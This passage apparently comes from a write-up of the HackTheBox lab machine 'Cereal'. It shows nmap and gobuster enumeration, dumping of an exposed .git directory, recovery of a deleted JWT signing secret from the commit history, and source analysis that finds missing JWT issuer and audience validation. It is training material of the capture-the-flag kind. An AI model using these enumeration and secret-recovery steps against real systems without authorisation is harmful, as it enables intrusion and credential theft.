</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://cereal.htb/
</span></span><span class=line><span class=cl><span class=p>|</span>_https-redirect: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
</span></span><span class=line><span class=cl>443/tcp open  ssl/http Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Cereal
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>cereal.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-11-11T19:57:18
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2040-11-11T20:07:19
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class=p>;</span> +5s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 4s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 23.34 seconds
</span></span></code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p><p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80>TCP 80<a class=anchor aria-hidden=true href=#tcp-80>#</a></h3><p>It redirects to the HTTPS.</p><h3 id=tcp-443---cerealhtb>TCP 443 - cereal.htb<a class=anchor aria-hidden=true href=#tcp-443---cerealhtb>#</a></h3><p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p><p><div class=img-container><img src=imgs/image-20210605110703967.png alt=image-20210605110703967></div></p><p>Inspecting the source reveals that this site is a react based application.</p><p><div class=img-container><img src=imgs/image-20210609080804206.png alt=image-20210609080804206></div></p><p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p><p><div class=img-container><img src=imgs/image-20210609082429730.png alt=image-20210609082429730></div></p><p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p><h3 id=tcp-443---sourcecerealhtb>TCP 443 - source.cereal.htb<a class=anchor aria-hidden=true href=#tcp-443---sourcecerealhtb>#</a></h3><p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p><p><div class=img-container><img src=imgs/image-20210605111410148.png alt=image-20210605111410148></div></p><p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p><ul><li><code>C:\inetpub\source\default.aspx</code></li></ul><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     https://source.cereal.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              aspx,txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.git/HEAD            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 23<span class=o>]</span>
</span></span><span class=line><span class=cl>/Default.aspx         <span class=o>(</span>Status: 500<span class=o>)</span> <span class=o>[</span>Size: 10090<span class=o>]</span>
</span></span><span class=line><span class=cl>/aspnet_client        <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 163<span class=o>]</span> <span class=o>[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class=o>]</span>
</span></span><span class=line><span class=cl>/default.aspx         <span class=o>(</span>Status: 500<span class=o>)</span> <span class=o>[</span>Size: 9727<span class=o>]</span>                                              
</span></span><span class=line><span class=cl>/uploads              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 157<span class=o>]</span> <span class=o>[</span>--&gt; https://source.cereal.htb/uploads/<span class=o>]</span>      
</span></span><span class=line><span class=cl>                                                                                              
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/06/05 00:54:41 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ curl -I -k http://source.cereal.htb/.git/ <span class=o>&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>403</span> Forbidden
</span></span><span class=line><span class=cl>Content-Length: <span class=m>1233</span>
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span><span class=line><span class=cl>Server: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl>X-Powered-By: Sugar
</span></span><span class=line><span class=cl>Date: Sat, <span class=m>05</span> Jun <span class=m>2021</span> 05:01:25 GMT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>403</span> Forbidden
</span></span><span class=line><span class=cl>Content-Length: <span class=m>1233</span>
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span><span class=line><span class=cl>Server: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl>X-Powered-By: Sugar
</span></span><span class=line><span class=cl>Date: Sat, <span class=m>05</span> Jun <span class=m>2021</span> 05:08:16 GMT
</span></span></code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ curl -I -k http://source.cereal.htb/.git/HEAD
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Content-Length: <span class=m>23</span>
</span></span><span class=line><span class=cl>Content-Type: text/plain
</span></span><span class=line><span class=cl>Last-Modified: Wed, <span class=m>11</span> Nov <span class=m>2020</span> 20:09:34 GMT
</span></span><span class=line><span class=cl>Accept-Ranges: bytes
</span></span><span class=line><span class=cl>ETag: <span class=s2>&#34;adc1d19266b8d61:0&#34;</span>
</span></span><span class=line><span class=cl>Server: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl>X-Powered-By: Sugar
</span></span><span class=line><span class=cl>Date: Sat, <span class=m>05</span> Jun <span class=m>2021</span> 05:01:29 GMT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ curl -s -k http://source.cereal.htb/.git/HEAD
</span></span><span class=line><span class=cl>ref: refs/heads/master
</span></span></code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p><h3 id=git>Git<a class=anchor aria-hidden=true href=#git>#</a></h3><h4 id=dumping-git-directory>Dumping .git directory<a class=anchor aria-hidden=true href=#dumping-git-directory>#</a></h4><p>With <a href=https://github.com/arthaud/git-dumper>git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ mkdir loot/source-cereal-git <span class=o>&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Testing https://source.cereal.htb/.git/HEAD <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Testing https://source.cereal.htb/.git/ <span class=o>[</span>403<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching common files
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.gitignore <span class=o>[</span>404<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class=o>[</span>404<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/description <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Finding refs/
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class=o>[</span>404<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/config <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class=o>[</span>404<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/HEAD <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Finding packs
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Finding objects
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching objects
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Running git checkout .
</span></span></code></pre></div><h4 id=git-history>Git History<a class=anchor aria-hidden=true href=#git-history>#</a></h4><p>I could see the history of this repository by issuing <code>git log</code>.</p><p><div class=img-container><img src=imgs/image-20210605121727689.png alt=image-20210605121727689></div></p><p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p><p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p><p><div class=img-container><img src=imgs/image-20210609090452619.png alt=image-20210609090452619></div></p><p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p><ul><li>JWT secret: <code>secretlhfIH&FY*#oysuflkhskjfhefesf</code></li></ul><h3 id=source-code-analysis-1>Source Code Analysis #1<a class=anchor aria-hidden=true href=#source-code-analysis-1>#</a></h3><blockquote><p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p></blockquote><h4 id=app-overview>App Overview<a class=anchor aria-hidden=true href=#app-overview>#</a></h4><p>The app consist of ASP.NET (back-end) and React (front-end).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «source-cereal-git» «10.10.14.3» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ tree -L <span class=m>1</span> --dirsfirst
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── ClientApp
</span></span><span class=line><span class=cl>├── Controllers
</span></span><span class=line><span class=cl>├── Migrations
</span></span><span class=line><span class=cl>├── Models
</span></span><span class=line><span class=cl>├── Pages
</span></span><span class=line><span class=cl>├── Properties
</span></span><span class=line><span class=cl>├── Services
</span></span><span class=line><span class=cl>├── ApplicationOptions.cs
</span></span><span class=line><span class=cl>├── appsettings.Development.json
</span></span><span class=line><span class=cl>├── appsettings.json
</span></span><span class=line><span class=cl>├── CerealContext.cs
</span></span><span class=line><span class=cl>├── Cereal.csproj
</span></span><span class=line><span class=cl>├── DownloadHelper.cs
</span></span><span class=line><span class=cl>├── ExtensionMethods.cs
</span></span><span class=line><span class=cl>├── IPAddressHandler.cs
</span></span><span class=line><span class=cl>├── IPRequirement.cs
</span></span><span class=line><span class=cl>├── Program.cs
</span></span><span class=line><span class=cl>└── Startup.cs
</span></span></code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p><p>Here is the overview of app execution flow:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Program.cs
</span></span><span class=line><span class=cl> |
</span></span><span class=line><span class=cl> v
</span></span><span class=line><span class=cl>Startup.cs  -&gt; Loads appsettings.json
</span></span><span class=line><span class=cl> |
</span></span><span class=line><span class=cl> v
</span></span><span class=line><span class=cl>React client
</span></span></code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p><ul><li>There is IP whitelist</li><li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=err>...&lt;SNIP&gt;...</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;AllowedHosts&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;ApplicationOptions&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Whitelist&#34;</span><span class=p>:</span> <span class=p>[</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;::1&#34;</span> <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;IpRateLimiting&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;EnableEndpointRateLimiting&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;StackBlockedRequests&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RealIpHeader&#34;</span><span class=p>:</span> <span class=s2>&#34;X-Real-IP&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ClientIdHeader&#34;</span><span class=p>:</span> <span class=s2>&#34;X-ClientId&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;HttpStatusCode&#34;</span><span class=p>:</span> <span class=mi>429</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;IpWhitelist&#34;</span><span class=p>:</span> <span class=p>[</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;::1&#34;</span> <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;EndpointWhitelist&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ClientWhitelist&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;GeneralRules&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Endpoint&#34;</span><span class=p>:</span> <span class=s2>&#34;post:/requests&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Period&#34;</span><span class=p>:</span> <span class=s2>&#34;5m&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Limit&#34;</span><span class=p>:</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Endpoint&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Period&#34;</span><span class=p>:</span> <span class=s2>&#34;5m&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Limit&#34;</span><span class=p>:</span> <span class=mi>150</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=authentication-vulnerability>Authentication Vulnerability<a class=anchor aria-hidden=true href=#authentication-vulnerability>#</a></h4><p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href=https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer>this can raise a security issue</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span><span class=line><span class=cl>    <span class=kt>var</span> <span class=n>key</span> <span class=p>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=s>&#34;*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>services</span><span class=p>.</span><span class=n>AddAuthentication</span><span class=p>(</span><span class=n>x</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>.</span><span class=n>DefaultAuthenticateScheme</span> <span class=p>=</span> <span class=n>JwtBearerDefaults</span><span class=p>.</span><span class=n>AuthenticationScheme</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>.</span><span class=n>DefaultChallengeScheme</span> <span class=p>=</span> <span class=n>JwtBearerDefaults</span><span class=p>.</span><span class=n>AuthenticationScheme</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>AddJwtBearer</span><span class=p>(</span><span class=n>x</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>.</span><span class=n>RequireHttpsMetadata</span> <span class=p>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>.</span><span class=n>SaveToken</span> <span class=p>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>.</span><span class=n>TokenValidationParameters</span> <span class=p>=</span> <span class=k>new</span> <span class=n>TokenValidationParameters</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ValidateIssuerSigningKey</span> <span class=p>=</span> <span class=k>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>IssuerSigningKey</span> <span class=p>=</span> <span class=k>new</span> <span class=n>SymmetricSecurityKey</span><span class=p>(</span><span class=n>key</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>ValidateIssuer</span> <span class=p>=</span> <span class=k>false</span><span class=p>,</span> <span class=c1>// &lt;== No validation</span>
</span></span><span class=line><span class=cl>            <span class=n>ValidateAudience</span> <span class=p>=</span> <span class=k>false</span> <span class=c1>// &lt;== No validation</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span></code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=k>public</span> <span class=n>User</span> <span class=n>Authenticate</span><span class=p>(</span><span class=kt>string</span> <span class=n>username</span><span class=p>,</span> <span class=kt>string</span> <span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>using</span> <span class=p>(</span><span class=kt>var</span> <span class=n>db</span> <span class=p>=</span> <span class=k>new</span> <span class=n>CerealContext</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>user</span> <span class=p>=</span> <span class=n>db</span><span class=p>.</span><span class=n>Users</span><span class=p>.</span><span class=n>Where</span><span class=p>(</span><span class=n>x</span> <span class=p>=&gt;</span> <span class=n>x</span><span class=p>.</span><span class=n>Username</span> <span class=p>==</span> <span class=n>username</span> <span class=p>&amp;&amp;</span> <span class=n>x</span><span class=p>.</span><span class=n>Password</span> <span class=p>==</span> <span class=n>password</span><span class=p>).</span><span class=n>SingleOrDefault</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// return null if user not found</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>user</span> <span class=p>==</span> <span class=k>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// authentication successful so generate jwt token</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>tokenHandler</span> <span class=p>=</span> <span class=k>new</span> <span class=n>JwtSecurityTokenHandler</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>key</span> <span class=p>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=s>&#34;*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>tokenDescriptor</span> <span class=p>=</span> <span class=k>new</span> <span class=n>SecurityTokenDescriptor</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>Subject</span> <span class=p>=</span> <span class=k>new</span> <span class=n>ClaimsIdentity</span><span class=p>(</span><span class=k>new</span> <span class=n>Claim</span><span class=p>[]</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>new</span> <span class=n>Claim</span><span class=p>(</span><span class=n>ClaimTypes</span><span class=p>.</span><span class=n>Name</span><span class=p>,</span> <span class=n>user</span><span class=p>.</span><span class=n>UserId</span><span class=p>.</span><span class=n>ToString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                    <span class=p>}),</span>
</span></span><span class=line><span class=cl>                    <span class=n>Expires</span> <span class=p>=</span> <span class=n>DateTime</span><span class=p>.</span><span class=n>UtcNow</span><span class=p>.</span><span class=n>AddDays</span><span class=p>(</span><span class=m>7</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                    <span class=n>SigningCredentials</span> <span class=p>=</span> <span class=k>new</span> <span class=n>SigningCredentials</span><span class=p>(</span><span class=k>new</span> <span class=n>SymmetricSecurityKey</span><span class=p>(</span><span class=n>key</span><span class=p>),</span> <span class=n>SecurityAlgorithms</span><span class=p>.</span><span class=n>HmacSha256Signature</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>};</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>token</span> <span class=p>=</span> <span class=n>tokenHandler</span><span class=p>.</span><span class=n>CreateToken</span><span class=p>(</span><span class=n>tokenDescriptor</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>user</span><span class=p>.</span><span class=n>Token</span> <span class=p>=</span> <span class=n>tokenHandler</span><span class=p>.</span><span class=n>WriteToken</span><span class=p>(</span><span class=n>token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>user</span><span class=p>.</span><span class=n>WithoutPassword</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span></code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p><p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>class</span> <span class=nc>User</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=na>        [Key]</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=kt>int</span> <span class=n>UserId</span> <span class=p>{</span> <span class=k>get</span><span class=p>;</span> <span class=k>set</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=na>        [Required]</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=kt>string</span> <span class=n>Username</span> <span class=p>{</span> <span class=k>get</span><span class=p>;</span> <span class=k>set</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=na>        [Required]</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=kt>string</span> <span class=n>Password</span> <span class=p>{</span> <span class=k>get</span><span class=p>;</span> <span class=k>set</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=kt>string</span> <span class=n>Token</span> <span class=p>{</span> <span class=k>get</span><span class=p>;</span> <span class=k>set</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span></code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p><blockquote><p>It&rsquo;ll ask the server if we press the login button (POST request).</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>...</span><span class=o>&lt;</span><span class=nx>SNIP</span><span class=o>&gt;</span><span class=p>...</span>
